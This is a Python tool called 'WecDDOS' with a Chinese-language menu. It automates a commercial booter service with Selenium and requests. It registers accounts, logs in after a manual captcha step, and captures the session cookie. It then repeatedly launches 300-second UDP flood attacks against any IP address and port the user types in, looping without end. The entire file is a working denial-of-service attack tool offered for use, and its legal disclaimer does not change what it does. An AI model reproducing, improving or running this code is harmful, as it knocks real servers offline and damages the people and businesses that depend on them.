from selenium import webdriver
import time
import os.path
import requests

def RegUser():
    print("注册账号说明：\n"
          "使用selenium来批量注册账号。\n"
          "注册一个账号，并获取账号的username和password，浏览器验证码页面。\n"
          "保存账号信息到info.ini配置文件。\n"
          "参数有：注册的time值，账号个数，每个账号的username，password和Cookies。\n"
          "---------------------\n")
    username = input("请输入你要注册的用户名：")
    password = input("请输入密码：")
    input("回车以确认开始注册账号...")
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    print("打开Chrome浏览器...")
    driver = webdriver.Chrome(options=options)
    print("正在注册账号，准备跳转注册页面...")
    driver.get("https://www.stressthem.to/register")
    time.sleep(2)
    driver.find_element_by_name("username").send_keys(username)
    driver.find_element_by_name("email").send_keys(username + "@ee.com")
    driver.find_element_by_name("password").send_keys(password)
    time.sleep(1)
    driver.find_element_by_xpath("//*[@class='jssubmit btn color sf']").click()
    input("注册页面——请在浏览器中查看是否有谷歌验证，如果有请先验证完毕跳转到登录页面后回车：")
    print("账号注册成功！\n账号：%s\n密码：%s" % (username, password))
    driver.quit()
    input("回车进入登录程序...")
    LoginUser()
    return

def LoginUser():
    print("登录账号说明：\n"
          "使用selenium库来登录账号，并获取对应账号的唯一Cookies。\n"
          "参数：读取info.ini配置文件。\n"
          "操作步骤：\n1.读取账号，读入username，password和Cookies。\n"
          "2.计算Cookies时间是否大于36000s=10h，如果大于则重新获取Cookies。\n"
          "获取Cookies步骤：使用selenium批量登录，登录完毕后获取网页Cookies保存到对应账号的info.ini配置中。\n"
          "---------------------\n")
    username = input("请输入账号：")
    password = input("请输入密码：")
    cookies = TrytoCookies(username, password)
    print("登录完毕，账号和Cookies信息已经保存到info.ini，准备进入攻击程序...")
    time.sleep(3)
    BeginStress(cookies)
    return

def TrytoCookies(username, password):
    print("登录账号时获取Cookies")
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    print("打开Chrome浏览器...")
    driver = webdriver.Chrome(options=options)
    driver.get("https://www.stressthem.to/login")
    time.sleep(3)
    driver.find_element_by_name("username").send_keys(username)
    driver.find_element_by_id("password").send_keys(password)
    time.sleep(1)
    driver.find_element_by_xpath("//*[@class='jssubmit btn color sf']").click()
    input("登录页面——请在浏览器中查看是否有谷歌验证，如果有请先验证完毕跳转到登录页面后回车：")
    time.sleep(1)
    driver.get("https://www.stressthem.to/booter")
    time.sleep(3)
    cookiiiies = driver.get_cookies()
    coookies = ""
    for item_cookie in cookiiiies:
        if item_cookie["name"] == "UID":
            coookies = item_cookie["value"]
            break
    driver.quit()
    print("成功获取到账号的Cookies:%s" % coookies)
    print("Cookies获取完成！")
    return coookies

def BeginStress(cookies):
    while True:
        print("开始攻击...")
        ip = input("请输入ip地址：")
        port = input("请输入端口：")
        url = "https://www.stressthem.to/booter?handle"
        data = "{\"method_l4\":\"udpmix\",\"host\":\"" + ip + "\",\"port\":" + port + ",\"time\":300}"
        print(data)
        goodmsg = '"{"type":1,"status":1,"message":"Your Attack started","targetLink":"\/booter","autoRedirect":4}"'
        headers = {}
        headers[
            "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
        headers["Cookie"] = "UID=" + cookies
        print(headers)
        res = requests.post(url, data=data, headers=headers)
        result = res.text
        print(result)
        if result == goodmsg:
            print("成功！")
            continue
        else:
            print("失败！")
            time.sleep(999999999)
            continue

def UpdateLogcat():
    print("更新日志")
    input("回车来返回主页面...")

def DonateQRcode():
    print("捐赠")
    input("回车来返回主页面...")

def Helpline():
    print("帮助列表")
    input("按回车键返回主菜单...")

def OldSeleniumMode():
    usera = input("请输入你的账号：")
    pwda = input("请输入你的密码：")
    dotimes = 0
    p = True
    iptemp = ''
    port = ''
    times = 0
    while p:
        iptemp = input("请输入你要DDOS的IP地址：")
        port = input("请输入端口：")
        if iptemp == "" or port == "" or times == "" or iptemp == "" or port == "":
            print("你还没有填写ip地址或端口，请正确填写！")
            time.sleep(3)
            os.system("cls")
            continue
        p = False
        print("成功读取到攻击信息")
    input("回车以开始攻击...")
    os.system("cls")
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    print("打开Chrome浏览器...")
    driver = webdriver.Chrome(options=options)
    print("跳转登录页面...")
    driver.get("https://www.stressthem.to/login")
    time.sleep(1)
    driver.find_element_by_name("username").send_keys(usera)
    driver.find_element_by_id("password").send_keys(pwda)
    time.sleep(1)
    print("账号信息输入完毕，开始登录...")
    driver.find_element_by_xpath("//*[@class='jssubmit btn color sf']").click()
    input("请先检查是否有谷歌验证弹出，如有请手动通过验证后回车继续：")
    print("检查中...", end="")
    driver.get("https://www.stressthem.to/booter")
    time.sleep(3)
    if driver.current_url == "https://www.stressthem.to/booter":
        print("登录成功！")
        time.sleep(2)
    else:
        print("登录错误！准备重新开始...")
        time.sleep(3)
        return
    os.system("cls")
    starttime = time.time()
    while True:
        print("---------------------")
        driver.get("https://www.stressthem.to/booter")
        time.sleep(2)
        p = True
        while p:
            try:
                driver.find_element_by_xpath("//*[@class='btn jssubmit sf']")
                p = False
            except:
                print("当前页面不是Booter页面，尝试刷新...")
                driver.get("https://www.stressthem.to/booter")
                time.sleep(3)
        print("成功访问到Booter页面...")
        time.sleep(1)
        driver.find_element_by_xpath(".//*[@name='method_l4']/option[2]").click()
        driver.find_element_by_name("host").send_keys(iptemp)
        driver.find_element_by_name("port").send_keys(port)
        driver.find_element_by_name("time").send_keys('300')
        print("成功填写IP和端口信息..")
        target = driver.find_element_by_xpath("//*[@class='btn jssubmit sf']")
        driver.execute_script("arguments[0].scrollIntoView();", target)  # 拖动到可见的“开始攻击”按钮去
        print("拖动到按钮处...")
        time.sleep(2)
        driver.find_element_by_xpath("//*[@class='btn jssubmit sf']").click()
        dotimes += 1
        print("正在攻击中......")
        time.sleep(300)
        print("完成.")
        print("成功执行%d次，已运行%s秒" % (dotimes, str(int(time.time() - starttime))))

os.system("title WecDDOS")
os.system("mode con cols=85 lines=20")
while True:
    print("——————————————————————————————————————————————————————\n"
          "WecDDOS  V1.6.18\n"
          "请勿将本软件用于各种非法用途，违者后果自负！"
          "——————————————————————————————————————————————————————\n"
          "请输入对应数字来使用功能：\n"
          "----------\n"
          "1.注册账号\n"
          "2.开始攻击（selenium模式，适合Windows+翻墙环境使用）\n"
          "3.开始攻击（requsets模式，此功能只能在国外使用，在国内必须输入国外代理ip）\n"
          "----------\n"
          "4.更新日志\n"
          "5.捐赠\n"
          "6.帮助\n"
          "----------\n"
          "")
    tempinput = input("请根据帮助来输入数字来操作：")
    if tempinput == "1":
        RegUser()
        continue
    elif tempinput == "2":
        while True:
            OldSeleniumMode()
    elif tempinput == "3":
        LoginUser()
        continue
    elif tempinput == "4":
        UpdateLogcat()
        continue
    elif tempinput == "5":
        DonateQRcode()
        continue
    elif tempinput == "6":
        Helpline()
        continue
